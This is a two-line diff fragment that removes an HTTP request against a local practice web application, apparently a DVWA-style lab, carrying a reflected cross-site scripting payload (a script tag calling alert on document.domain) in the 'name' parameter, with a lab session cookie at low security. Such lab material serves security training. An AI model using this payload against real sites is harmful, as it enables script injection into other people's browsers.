@@ -1,2 +1,0 @@
-GET http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert(document.domain)</script>
-Cookie: PHPSESSID=(lab session); security=low
